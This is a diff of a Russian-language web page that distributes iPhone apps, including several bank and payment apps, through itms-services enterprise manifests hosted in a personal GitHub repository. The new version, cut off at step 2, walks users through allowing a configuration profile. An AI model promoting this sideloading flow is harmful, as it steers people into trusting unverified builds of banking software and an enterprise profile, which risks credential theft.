@@ -1,238 +1,381 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Установка приложений на iPhone</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #000000;
-            color: #f5f5f7;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            box-sizing: border-box;
-        }
-        .container {
-            max-width: 450px;
-            width: 100%;
-            background: #1c1c1e;
-            padding: 25px;
-            border-radius: 24px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
-            box-sizing: border-box;
-            margin: 20px 0;
-            animation: fadeInUp 0.4s cubic-bezier(0.25, 1, 0.5, 1) forwards;
-        }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .header { text-align: center; margin-bottom: 25px; }
-        .app-icon {
-            width: 80px; height: 80px; border-radius: 18px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.5); margin-bottom: 15px;
-        }
-        h1 { font-size: 24px; margin: 0 0 8px 0; }
-        .subtitle { color: #8e8e93; font-size: 14px; margin: 0; }
-        #buttons-container { margin-bottom: 35px; }
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#0b0c0d">
+  <title>Инструкция по установке приложений на iPhone — ВашеИмя Apps</title>
+  <meta name="description" content="Пошаговая инструкция по установке приложений на iPhone.">
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #0b0c0d;
+      --panel: #151718;
+      --panel-2: #101213;
+      --line: rgba(255, 255, 255, 0.11);
+      --text: #f5f7f7;
+      --muted: #9ca1a5;
+      --accent: #c8ff36;
+      --accent-soft: rgba(200, 255, 54, 0.1);
+      --warning: #ffbd59;
+      --warning-soft: rgba(255, 189, 89, 0.1);
+      --radius: 25px;
+    }
 
-        .btn-install {
-            display: flex; align-items: center; justify-content: center;
-            text-decoration: none; padding: 12px 16px;
-            border-radius: 14px; font-weight: 600; font-size: 16px;
-            margin-bottom: 12px; transition: filter 0.2s, transform 0.1s;
-        }
-        .btn-install:last-child { margin-bottom: 0; }
-        .btn-install:hover { filter: brightness(1.1); }
-        .btn-install:active { transform: scale(0.98); }
-        .btn-icon {
-            width: 24px; height: 24px; border-radius: 7px;
-            margin-right: 10px; object-fit: cover; flex-shrink: 0;
-        }
+    * {
+      box-sizing: border-box;
+    }
 
-        /* Цвета кнопок */
-        .btn-max { background-color: #002df1; color: #ffffff; }
-        .btn-vk { background-color: #0077ff; color: #ffffff; }
-        .btn-avito { background-color: #ffffff; color: #000000; }
-        .btn-sber { background-color: #21a038; color: #ffffff; }
-        .btn-tbank { background-color: #ffdd2d; color: #000000; }
-        .btn-alfa { background-color: #ef3124; color: #ffffff; }
-        .btn-mail { background-color: #005ffc; color: #ffffff; }
-        .btn-ypay {
-            background-color: #000000; color: #ffffff;
-            border: 1px solid #ff3333; box-shadow: 0 0 8px rgba(255, 51, 51, 0.2);
-        }
-        .btn-ozon { background-color: #005bff; color: #ffffff; }
-        .btn-wb { background-color: #cb11ab; color: #ffffff; }
-        .btn-chatgpt { background-color: #ffffff; color: #000000; border: 1px solid #000000; }
-        .btn-vk-live { background-color: #ff283e; color: #ffffff; }
-        .btn-happ { background-color: #e5e5ea; color: #1a1a1a; }
-        .btn-vtb { background-color: #0a2a73; color: #ffffff; }
-        .btn-spotify { background-color: #1db954; color: #000000; }
-        .btn-vk-clips { background-color: #cc41f3; color: #ffffff; }
-        .btn-vk-music { background-color: #9b47e0; color: #ffffff; }
-        .btn-vk-video { background-color: #ff2333; color: #ffffff; }
-        .btn-vk-messenger { background-color: #00c2ff; color: #ffffff; }
+    html {
+      scroll-behavior: smooth;
+    }
 
-        /* --- СТИЛИ ИНСТРУКЦИИ (в твоём стиле) --- */
-        .instruction-wrapper {
-            width: 100%;
-            border-top: 1px solid #38383a;
-            padding-top: 22px;
-            margin-top: 20px;
-        }
-        .instruction-header {
-            margin-bottom: 18px;
-        }
-        .instruction-title {
-            font-size: 19px;
-            font-weight: 700;
-            margin: 0 0 6px 0;
-            line-height: 1.2;
-        }
-        .instruction-subtitle {
-            color: #8e8e93;
-            font-size: 14px;
-            margin: 0;
-        }
-        .steps-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-        .step-item {
-            display: flex;
-            gap: 14px;
-            margin-bottom: 18px;
-        }
-        .step-item:last-child {
-            margin-bottom: 0;
-        }
-        .step-number {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            background: #2c2c2e;
-            color: #0a84ff;
-            font-weight: 700;
-            font-size: 13px;
-            flex-shrink: 0;
-        }
-        .step-content h3 {
-            margin: 0 0 5px 0;
-            font-size: 16px;
-            font-weight: 600;
-            color: #f5f5f7;
-        }
-        .step-content p {
-            margin: 0;
-            font-size: 14px;
-            color: #8e8e93;
-            line-height: 1.45;
-        }
-        .step-image-wrapper {
-            margin-top: 12px;
-            border-radius: 14px;
-            overflow: hidden;
-            border: 1px solid #38383a;
-        }
-        .step-image {
-            width: 100%;
-            display: block;
-            object-fit: contain;
-        }
-    </style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background:
+        radial-gradient(circle at 86% -4%, rgba(200, 255, 54, 0.13), transparent 34rem),
+        radial-gradient(circle at -10% 24%, rgba(89, 171, 255, 0.07), transparent 30rem),
+        var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Поддержка вашей премиальной стеклянной темы */
+    body.theme-glass {
+      --bg: #071017;
+      --panel: rgba(13, 28, 38, 0.84);
+      --panel-2: rgba(8, 19, 27, 0.92);
+      --line: rgba(132, 205, 255, 0.2);
+      --text: #f2fbff;
+      --muted: #91a9b8;
+      --accent: #68dcff;
+      --accent-soft: rgba(104, 220, 255, 0.13);
+      --warning: #ffd166;
+      --warning-soft: rgba(255, 209, 102, 0.09);
+      background:
+        linear-gradient(135deg, rgba(104, 220, 255, 0.08), transparent 38%),
+        radial-gradient(circle at 86% 8%, rgba(185, 167, 255, 0.17), transparent 30rem),
+        radial-gradient(circle at 0 78%, rgba(104, 220, 255, 0.1), transparent 28rem),
+        #071017;
+    }
+
+    body.theme-glass .brand {
+      text-transform: none;
+      letter-spacing: 0.04em;
+    }
+
+    body.theme-glass .brand-mark {
+      border-radius: 50%;
+      background: linear-gradient(145deg, rgba(104, 220, 255, 0.24), rgba(185, 167, 255, 0.13));
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.18), 0 14px 36px rgba(0,0,0,0.32);
+      color: #f2fbff;
+    }
+
+    body.theme-glass .step,
+    body.theme-glass .important {
+      border-radius: 18px;
+      background: linear-gradient(145deg, rgba(16, 34, 45, 0.84), rgba(8, 19, 27, 0.88));
+      backdrop-filter: blur(18px);
+    }
+
+    body.theme-glass .progress a:active {
+      background: linear-gradient(135deg, #68dcff, #b9a7ff);
+      color: #061018;
+    }
+
+    a {
+      color: inherit;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .noise {
+      position: fixed;
+      inset: 0;
+      z-index: 20;
+      pointer-events: none;
+      opacity: 0.035;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 180 180' xmlns='http://w3.org id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.8'/%3E%3C/svg%3E");
+    }
+
+    .shell {
+      width: min(100%, 860px);
+      margin: 0 auto;
+      padding: 18px 16px calc(60px + env(safe-area-inset-bottom));
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 44px;
+      margin-bottom: 42px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 800;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+    }
+
+    .brand-mark {
+      display: grid;
+      place-items: center;
+      width: 32px;
+      height: 32px;
+      border: 1px solid var(--line);
+      border-radius: 9px;
+      background: rgba(21, 23, 24, 0.9);
+      color: var(--accent);
+      font-size: 13px;
+      font-weight: 900;
+      letter-spacing: 0;
+      overflow: hidden;
+    }
+
+    .brand-mark img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .guide-badge {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .guide-badge::before {
+      content: "";
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 0 5px var(--accent-soft);
+    }
+
+    .eyebrow,
+    .step-number {
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+    }
+
+    h1 {
+      max-width: 750px;
+      margin: 12px 0 15px;
+      font-size: clamp(43px, 9vw, 78px);
+      line-height: 0.95;
+      letter-spacing: -0.065em;
+    }
+
+    .hero-copy {
+      max-width: 610px;
+      margin: 0;
+      color: var(--muted);
+      font-size: 17px;
+      line-height: 1.55;
+    }
+
+    .important {
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 13px;
+      margin: 30px 0 35px;
+      padding: 17px;
+      border: 1px solid rgba(255, 189, 89, 0.24);
+      border-radius: 18px;
+      background: var(--warning-soft);
+    }
+
+    .important-icon {
+      display: grid;
+      place-items: center;
+      width: 34px;
+      height: 34px;
+      border-radius: 10px;
+      background: rgba(255, 189, 89, 0.12);
+      color: var(--warning);
+      font-weight: 900;
+    }
+
+    .important strong {
+      display: block;
+      margin-bottom: 4px;
+      color: var(--warning);
+      font-size: 14px;
+    }
+
+    .important p {
+      margin: 0;
+      color: #d4c5ad;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .progress {
+      display: flex;
+      gap: 7px;
+      margin: 0 0 35px;
+      padding: 5px 0 10px;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+
+    .progress::-webkit-scrollbar {
+      display: none;
+    }
+
+    .progress a {
+      display: grid;
+      flex: 0 0 auto;
+      place-items: center;
+      width: 35px;
+      height: 35px;
+      border: 1px solid var(--line);
+      border-radius: 11px;
+      background: rgba(21, 23, 24, 0.8);
+      color: var(--muted);
+      font-size: 12px;
+      font-weight: 800;
+      text-decoration: none;
+      transition: background 0.2s, color 0.2s;
+    }
+
+    .progress a:hover {
+      border-color: var(--accent);
+    }
+
+    .steps {
+      display: grid;
+      gap: 24px;
+    }
+
+    .step {
+      scroll-margin-top: 16px;
+      overflow: hidden;
+      padding: 24px;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: linear-gradient(145deg, rgba(26, 28, 30, 0.97), rgba(16, 18, 19, 0.97));
+    }
+
+    .step h2 {
+      margin: 9px 0 8px;
+      font-size: clamp(24px, 5vw, 31px);
+      line-height: 1.08;
+      letter-spacing: -0.04em;
+    }
+
+    .step-copy {
+      max-width: 650px;
+      margin: 0 0 20px;
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.55;
+    }
+
+    .step-copy strong {
+      color: var(--text);
+    }
+
+    .shot-link {
+      display: block;
+      overflow: hidden;
+      border: 1px solid var(--line);
+      border-radius: 20px;
+      background: #050606;
+      text-decoration: none;
+    }
+
+    .shot-link img {
+      display: block;
+      width: 100%;
+      max-height: 680px;
+      object-fit: contain;
+      background: #000;
+    }
+
+    .shot-caption {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      padding: 12px 14px;
+      border-top: 1px solid var(--line);
+      color: var(--muted);
+      font-size: 12px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="logo.png" class="app-icon" alt="App Icon" onerror="this.style.display='none'">
-            <h1>Установка приложений</h1>
-            <p class="subtitle">Выберите приложение для iOS</p>
+
+  <div class="noise"></div>
+
+  <div class="shell">
+    <div class="topbar">
+      <a href="#" class="brand">
+        <div class="brand-mark">
+          <img src="logo.png" alt="Logo" onerror="this.style.display='none'; this.parentNode.innerText='V'">
         </div>
+        <span>ВашеИмя Apps</span>
+      </a>
+      <div class="guide-badge">Инструкция</div>
+    </div>
 
-        <div id="buttons-container">
-            <!-- Кнопки A–J (1–10) -->
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/max.plist" class="btn-install btn-max" data-letter="A">
-                <img src="MAX logo.png" class="btn-icon" alt=""> Установить MAX
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/vk.plist" class="btn-install btn-vk" data-letter="B">
-                <img src="VK logo.png" class="btn-icon" alt=""> Установить VK
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/avito.plist" class="btn-install btn-avito" data-letter="C">
-                <img src="Avito logo.jpg" class="btn-icon" alt=""> Установить Авито
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/sber.plist" class="btn-install btn-sber" data-letter="D">
-                <img src="SBER logo.jpg" class="btn-icon" alt=""> Установить СБЕР
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/tbank.plist" class="btn-install btn-tbank" data-letter="E">
-                <img src="Tbank logo.jpg" class="btn-icon" alt=""> Установить Т-Банк
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/alfa.plist" class="btn-install btn-alfa" data-letter="F">
-                <img src="Alfa Bank logo.jpg" class="btn-icon" alt=""> Установить Альфа-Банк
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/mail.plist" class="btn-install btn-mail" data-letter="G">
-                <img src="Mail logo.jpg" class="btn-icon" alt=""> Установить Почта Mail
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/ypay.plist" class="btn-install btn-ypay" data-letter="H">
-                <img src="Yandex Pay logo.png" class="btn-icon" alt=""> Установить Яндекс Пэй
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/ozon.plist" class="btn-install btn-ozon" data-letter="I">
-                <img src="ozon bank logo.jpg" class="btn-icon" alt=""> Установить Ozon Банк
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/shurikApp/refs/heads/main/wb.plist" class="btn-install btn-wb" data-letter="J">
-                <img src="WB logo.png" class="btn-icon" alt=""> Установить Wildberries
-            </a>
+    <span class="eyebrow">Руководство iOS</span>
+    <h1>Установка в 12 шагов</h1>
+    <p class="hero-copy">Подробный разбор процесса конфигурации корпоративного профиля для успешного запуска сторонних приложений на вашем iPhone.</p>
 
-            <!-- Кнопки K–S (11–19) -->
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/chatgpt.plist" class="btn-install btn-chatgpt" data-letter="K">
-                <img src="ChatGPT logo.png" class="btn-icon" alt=""> Установить ChatGPT
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/vk_live.plist" class="btn-install btn-vk-live" data-letter="L">
-                <img src="VK Live logo.png" class="btn-icon" alt=""> Установить VK Видео Live
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/happ.plist" class="btn-install btn-happ" data-letter="M">
-                <img src="Happ logo.png" class="btn-icon" alt=""> Установить Happ
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/vtb.plist" class="btn-install btn-vtb" data-letter="N">
-                <img src="VTB logo.png" class="btn-icon" alt=""> Установить ВТБ
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/spotify.plist" class="btn-install btn-spotify" data-letter="O">
-                <img src="Spotify logo.png" class="btn-icon" alt=""> Установить Spotify
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/vk_clips.plist" class="btn-install btn-vk-clips" data-letter="P">
-                <img src="VK Clips logo.png" class="btn-icon" alt=""> Установить VK Клипы
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/vk_music.plist" class="btn-install btn-vk-music" data-letter="Q">
-                <img src="VK Music logo.png" class="btn-icon" alt=""> Установить VK Music
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/vk_video.plist" class="btn-install btn-vk-video" data-letter="R">
-                <img src="VK Video logo.png" class="btn-icon" alt=""> Установить VK Видео
-            </a>
-            <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/shurikoriginal-ru/original/refs/heads/main/vk_messenger.plist" class="btn-install btn-vk-messenger" data-letter="S">
-                <img src="VK Messenger logo.png" class="btn-icon" alt=""> Установить VK Messenger
-            </a>
+    <div class="important">
+      <div class="important-icon">!</div>
+      <div>
+        <strong>Обратите внимание</strong>
+        <p>Каждый шаг критически важен. Внимательно сверяйте действия на экране вашего телефона с интерактивными скриншотами ниже.</p>
+      </div>
+    </div>
+
+    <div class="progress">
+      <a href="#step-1">1</a>
+      <a href="#step-2">2</a>
+      <a href="#step-3">3</a>
+      <a href="#step-4">4</a>
+      <a href="#step-5">5</a>
+      <a href="#step-6">6</a>
+      <a href="#step-7">7</a>
+      <a href="#step-8">8</a>
+      <a href="#step-9">9</a>
+      <a href="#step-10">10</a>
+      <a href="#step-11">11</a>
+      <a href="#step-12">12</a>
+    </div>
+
+    <div class="steps">
+
+      <!-- Шаг 1 -->
+      <div class="step" id="step-1">
+        <span class="step-number">Шаг 01</span>
+        <h2>Инициация скачивания</h2>
+        <p class="step-copy">Выберите интересующий программный пакет на нашей витрине и активируйте действие нажатием на кнопку <strong>«Скачать»</strong>.</p>
+        <div class="shot-link">
+          <img src="img/step1.jpg" alt="Шаг 1" onerror="this.closest('.step').style.display='none'">
+          <div class="shot-caption"><span>Экран браузера</span><span>Запуск процесса</span></div>
         </div>
+      </div>
 
-        <!-- ИНСТРУКЦИЯ (полностью дописана) -->
-        <div class="instruction-wrapper">
-            <div class="instruction-header">
-                <h2 class="instruction-title">Как установить приложение</h2>
-                <p class="instruction-subtitle">Пошаговая инструкция для iPhone (только Safari)</p>
-            </div>
-            <ul class="steps-list">
-                <!-- Шаг 1 -->
-                <li class="step-item">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h3>Откройте страницу в Safari</h3>
-                        <p>Установка работает только в браузере Safari на iOS. Не используйте Chrome
+      <!-- Шаг 2 -->
+      <div class="step" id="step-2">
+        <span class="step-number">Шаг 02</span>
+        <h2>Разрешение в Safari</h2>
+        <p class="step-copy">При появлении модального окна операционной системы подтвердите намерение, выбрав вариант <strong>«Разрешить»</strong> для загрузки профиля конфигурации.</p>
+        <div class="shot-link">
